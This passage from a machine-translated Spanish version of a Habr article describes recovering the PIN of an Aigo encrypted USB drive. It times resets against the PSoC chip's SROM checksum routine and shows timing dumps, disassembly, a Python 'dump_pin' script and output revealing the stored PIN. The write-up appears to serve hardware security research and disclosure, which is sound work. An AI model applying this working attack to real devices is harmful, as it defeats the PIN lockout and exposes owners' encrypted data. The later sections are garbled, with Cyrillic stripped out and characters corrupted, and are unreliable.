resultado del script Python se ve as√≠ (simplificado para facilitar la lectura): </p><br><pre> <code class="plaintext hljs">DELAY F1 F8 F9 # F1 ‚Äì    # F8     # F9     00000 03 E1 19 [...] 00016 F9 00 03 00016 F9 00 00 00016 F9 00 03 00016 F9 00 03 00016 F9 00 03 00016 F9 00 00 #     0 00017 FB 00 00 [...] 00023 F8 00 00 00024 80 80 00 # 1- : 0x0080-0x0000 = 0x80 00024 80 80 00 00024 80 80 00 [...] 00057 CC E7 00 # 2- : 0xE7-0x80: 0x67 00057 CC E7 00 00057 01 17 01 #   ,    00057 01 17 01 00057 01 17 01 00058 D0 17 01 00058 D0 17 01 00058 D0 17 01 00058 D0 17 01 00058 F8 E7 00 #  E7? 00058 D0 17 01 [...] 00059 E7 E7 00 00060 17 17 00 #  [...] 00062 00 17 00 00062 00 17 00 00063 01 17 01 # , !        00063 01 17 01 [...] 00075 CC 17 01 # , 0x117-0xE7: 0x30</code> </pre> <br><p>  Al mismo tiempo, tenemos un problema: dado que operamos en la suma de verificaci√≥n real, un byte cero no cambia el valor de lectura.  Sin embargo, dado que todo el procedimiento de c√°lculo (8192 bytes) toma 0.1478 segundos (con ligeras desviaciones en cada inicio), que corresponde aproximadamente a 18.04 Œºs por byte, podemos usar este tiempo para verificar el valor de la suma de verificaci√≥n en los momentos adecuados.  Para las primeras ejecuciones, todo se lee con bastante facilidad, ya que la duraci√≥n del procedimiento computacional es casi la misma.  Sin embargo, el final de este volcado es menos preciso, porque las "desviaciones insignificantes en el tiempo" con cada ejecuci√≥n se resumen y se vuelven significativas: </p><br><pre> <code class="plaintext hljs">134023 D0 02 DD 134023 CC D2 DC 134023 CC D2 DC 134023 CC D2 DC 134023 FB D2 DC 134023 3F D2 DC 134023 CC D2 DC 134024 02 02 DC 134024 CC D2 DC 134024 F9 02 DC 134024 03 02 DD 134024 21 02 DD 134024 02 D2 DC 134024 02 02 DC 134024 02 02 DC 134024 F8 D2 DC 134024 F8 D2 DC 134025 CC D2 DC 134025 EF D2 DC 134025 21 02 DD 134025 F8 D2 DC 134025 21 02 DD 134025 CC D2 DC 134025 04 D2 DC 134025 FB D2 DC 134025 CC D2 DC 134025 FB 02 DD 134026 03 02 DD 134026 21 02 DD</code> </pre> <br><p>  Estos son 10 volcados por cada retraso de microsegundos.  El tiempo operativo total para descargar todos los 8192 bytes de una unidad flash es de aproximadamente 48 horas. </p><br><a name="a73"></a><br><h2 id="73-rekonstrukciya-flesh-binarnika">  7.3.  Reconstrucci√≥n del binario flash. </h2><br><p>  Todav√≠a no he terminado de escribir un c√≥digo que reconstruya completamente el c√≥digo del programa de la unidad flash, teniendo en cuenta todas las desviaciones en el tiempo.  Sin embargo, ya he restaurado el comienzo de este c√≥digo.  Para asegurarme de que lo hice correctamente, lo desarme usando m8cdis: </p><br><pre> <code class="plaintext hljs">0000: 80 67 jmp 0068h ; Reset vector [...] 0068: 71 10 or F,010h 006a: 62 e3 87 mov reg[VLT_CR],087h 006d: 70 ef and F,0efh 006f: 41 fe fb and reg[CPU_SCR1],0fbh 0072: 50 80 mov A,080h 0074: 4e swap A,SP 0075: 55 fa 01 mov [0fah],001h 0078: 4f mov X,SP 0079: 5b mov A,X 007a: 01 03 add A,003h 007c: 53 f9 mov [0f9h],A 007e: 55 f8 3a mov [0f8h],03ah 0081: 50 06 mov A,006h 0083: 00 ssc [...] 0122: 18 pop A 0123: 71 10 or F,010h 0125: 43 e3 10 or reg[VLT_CR],010h 0128: 70 00 and F,000h ; Paging mode changed from 3 to 0 012a: ef 62 jacc 008dh 012c: e0 00 jacc 012dh 012e: 71 10 or F,010h 0130: 62 e0 02 mov reg[OSC_CR0],002h 0133: 70 ef and F,0efh 0135: 62 e2 00 mov reg[INT_VC],000h 0138: 7c 19 30 lcall 1930h 013b: 8f ff jmp 013bh 013d: 50 08 mov A,008h 013f: 7f ret</code> </pre> <br><p>  ¬°Parece bastante cre√≠ble! </p><br><a name="a74"></a><br><h2 id="74-nahodim-adres-hraneniya-pinkoda">  7.4.  Encuentra la direcci√≥n de almacenamiento de c√≥digo PIN </h2><br><p>  Ahora que podemos leer la suma de verificaci√≥n en el momento que necesitamos, podemos verificar f√°cilmente c√≥mo y d√≥nde cambia cuando: </p><br><ul><li>  ingrese el c√≥digo PIN incorrecto; </li><li>  cambia el c√≥digo PIN. </li></ul><br><p>  Primero, para encontrar la direcci√≥n de almacenamiento aproximada, realic√© un volcado de suma de comprobaci√≥n en incrementos de 10 ms despu√©s de un reinicio.  Luego ingres√© el c√≥digo PIN incorrecto e hice lo mismo. </p><br><p>  El resultado no fue muy agradable, ya que hubo muchos cambios.  Pero al final, pude establecer que la suma de verificaci√≥n cambi√≥ en alg√∫n punto del intervalo entre 120,000 Œºs y 140,000 Œºs de retraso.  Pero el "c√≥digo PIN" que obtuve all√≠ estaba completamente equivocado, debido al artefacto del procedimiento delayMicroseconds, que hace cosas extra√±as cuando obtiene 0. </p><br><p>  Luego, despu√©s de pasar casi 3 horas, record√© que la llamada al sistema CheckSum SROM en la entrada recibe un argumento que especifica el n√∫mero de bloques para la suma de verificaci√≥n.  T.O.  podemos localizar f√°cilmente la direcci√≥n de almacenamiento del c√≥digo PIN y el contador de "intentos incorrectos", exactos al bloque de 64 bytes. </p><br><p>  Mis ejecuciones iniciales dieron el siguiente resultado: </p><br><p><img src="https://habrastorage.org/webt/0n/ol/xc/0nolxcgp8espvfdubrhrmvmbgrg.png"></p><br><p>  Luego cambi√© el c√≥digo PIN de "123456" a "1234567" y recib√≠: </p><br><p><img src="https://habrastorage.org/webt/0r/zp/s2/0rzps2e2mwldmhtot1tswiv7mdq.png"></p><br><p>  Por lo tanto, el c√≥digo PIN y el contador de intentos incorrectos parecen estar almacenados en el bloque No. 126. </p><br><a name="a75"></a><br><h2 id="75-snimaem-damp-bloka-126">  7.5.  Eliminamos el basurero del bloque No. 126 </h2><br><p>  El bloque No. 126 debe ubicarse en alg√∫n lugar en la regi√≥n de 125x64x18 = 144000mks, desde el comienzo del c√°lculo de la suma de verificaci√≥n, en mi volcado completo, y parece bastante cre√≠ble.  Luego, despu√©s de seleccionar manualmente numerosos volcados inv√°lidos (debido a la acumulaci√≥n de "ligeras desviaciones en el tiempo"), finalmente obtuve estos bytes (con un retraso de 145527 Œºs): </p><br><p><img src="https://habrastorage.org/webt/ji/31/ye/ji31yewphovunymnjxp0fcpwrdw.png"></p><br><p>  ¬°Est√° claro que el c√≥digo PIN se almacena sin cifrar!  Estos valores, por supuesto, no est√°n escritos en c√≥digos ASCII, pero como resultado, reflejan las lecturas tomadas del teclado capacitivo. </p><br><p>  Finalmente, realic√© algunas pruebas m√°s para encontrar d√≥nde se almacena el contador de intentos incorrectos.  Aqu√≠ est√° el resultado: </p><br><p><img src="https://habrastorage.org/webt/dc/r5/tf/dcr5tf0yevdxcg5lyrbcr9srowu.png"></p><br><p>  0xFF - significa "15 intentos", y disminuye con cada intento incorrecto. </p><br><a name="a76"></a><br><h2 id="76-vosstanovlenie-pinkoda">  7.6.  Recuperaci√≥n de c√≥digo PIN </h2><br><p>  Aqu√≠ est√° mi c√≥digo feo que re√∫ne todo lo anterior: </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump_pin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> pin_map = {<span class="hljs-number"><span class="hljs-number">0x24</span></span>: <span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-number"><span class="hljs-number">0x25</span></span>: <span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-number"><span class="hljs-number">0x26</span></span>: <span class="hljs-string"><span class="hljs-string">"2"</span></span>, <span class="hljs-number"><span class="hljs-number">0x27</span></span>:<span class="hljs-string"><span class="hljs-string">"3"</span></span>, <span class="hljs-number"><span class="hljs-number">0x20</span></span>: <span class="hljs-string"><span class="hljs-string">"4"</span></span>, <span class="hljs-number"><span class="hljs-number">0x21</span></span>: <span class="hljs-string"><span class="hljs-string">"5"</span></span>, <span class="hljs-number"><span class="hljs-number">0x22</span></span>: <span class="hljs-string"><span class="hljs-string">"6"</span></span>, <span class="hljs-number"><span class="hljs-number">0x23</span></span>: <span class="hljs-string"><span class="hljs-string">"7"</span></span>, <span class="hljs-number"><span class="hljs-number">0x2c</span></span>: <span class="hljs-string"><span class="hljs-string">"8"</span></span>, <span class="hljs-number"><span class="hljs-number">0x2d</span></span>: <span class="hljs-string"><span class="hljs-string">"9"</span></span>} last_csum = <span class="hljs-number"><span class="hljs-number">0</span></span> pin_bytes = [] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> delay <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">145495</span></span>, <span class="hljs-number"><span class="hljs-number">145719</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>): csum = csum_at(delay, <span class="hljs-number"><span class="hljs-number">1</span></span>) byte = (csum-last_csum)&amp;<span class="hljs-number"><span class="hljs-number">0xFF</span></span> <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"%05d %04x (%04x) =&gt; %02x"</span></span> % (delay, csum, last_csum, byte) pin_bytes.append(byte) last_csum = csum <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"PIN: "</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(pin_bytes)): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> pin_bytes[i] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> pin_map: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> pin_map[pin_bytes[i]], <span class="hljs-keyword"><span class="hljs-keyword">print</span></span></code> </pre> <br><p>  Aqu√≠ est√° el resultado de su ejecuci√≥n: </p><br><pre> <code class="plaintext hljs">$ ./psoc.py syncing: KO OK Resetting PSoC: KO Resetting PSoC: KO Resetting PSoC: OK 145495 53e2 (0000) =&gt; e2 145511 5407 (53e2) =&gt; 25 145527 542d (5407) =&gt; 26 145543 5454 (542d) =&gt; 27 145559 5474 (5454) =&gt; 20 145575 5495 (5474) =&gt; 21 145591 54b7 (5495) =&gt; 22 145607 54da (54b7) =&gt; 23 145623 5506 (54da) =&gt; 2c 145639 5506 (5506) =&gt; 00 145655 5533 (5506) =&gt; 2d 145671 554c (5533) =&gt; 19 145687 554e (554c) =&gt; 02 145703 554e (554e) =&gt; 00 PIN: 1 2 3 4 5 6 7 8 9</code> </pre> <br><p>  ¬°Hurra!  Funciona! </p><br><p>  Tenga en cuenta que los valores de retraso utilizados por m√≠ probablemente sean relevantes para un PSoC espec√≠fico: el que us√©. </p><br><a name="a8"></a><br><h1 id="8-chto-dalshe">  8. ¬øQu√© sigue? </h1><br><p> ,     PSoC,     Aigo: </p><br><ul><li>    SRAM,      ; </li><li>      ,   ¬´   ¬ª,    . </li></ul><br><p>   ,       ‚Äì -   .       : </p><br><ul><li>       ,      ¬´   ¬ª; </li><li>  FPGA-       (    Arduino); </li><li>    :    ,     RAM,   ,       RAM,  .   Arduino    - ,    Arduino  5 ,            3,3 . </li></ul><br><p>   ,      ‚Äì   ,     .     ,         , ‚Äì  ,          . </p><br><p>  SROM,        ReadBlock,       ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="></a>     ‚Äì     ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">¬´REcon Brussels 2017¬ª</a> . </p><br><p>    ,      ‚Äì    :    SRAM,      . </p><br><a name="a9"></a><br><h1 id="9-zaklyuchenie"> 9.  </h1><br><p> ,      ,         ( ¬´¬ª) ‚Ä¶      (),         ! </p><br><p>     Aigo?  -   HDD-,   2015   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="></a>  SyScan,        HDD-,   ,       .  :-) </p><br><p>          .     40 .     (   )    ( ).    40   ,       .    . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/455529/">https://habr.com/ru/post/455529/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../455517/index.html">Graduado del curso de Netolog√≠a ‚ÄúData Science‚Äù sobre su trabajo en el sector bancario.</a></li>
<li><a href="../455519/index.html">C√≥mo implementamos la incorporaci√≥n de nuevos desarrolladores</a></li>
<li><a href="../455523/index.html">Implementaci√≥n de la interfaz de usuario de OpenStack LBaaS</a></li>
<li><a href="../455525/index.html">Zimbra y Mail Bomb Defense</a></li>
<li><a href="../455527/index.html">¬øQu√© est√° escrito en esto? Detr√°s de escena de objetos JavaScript</a></li>
<li><a href="../455533/index.html">Bubble Physics: A Search for Foam Destruction Mechanism</a></li>
<li><a href="../455535/index.html">Administrar certificados SSL / TLS en las nubes y contenedores, no trabajo humano</a></li>
<li><a href="../455537/index.html">Amplia optimizaci√≥n de b√∫squeda: c√≥mo procesar un gr√°fico con 10 mil millones de estados</a></li>
<li><a href="../455539/index.html">Ps√≠quicos m√≥viles: 10 datos nuevos sobre c√≥mo los dispositivos port√°tiles lo est√°n mirando</a></li>
<li><a href="../455543/index.html">¬øEs f√°cil y conveniente preparar Kubernetes Cluster? Anunciar operador de complemento</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>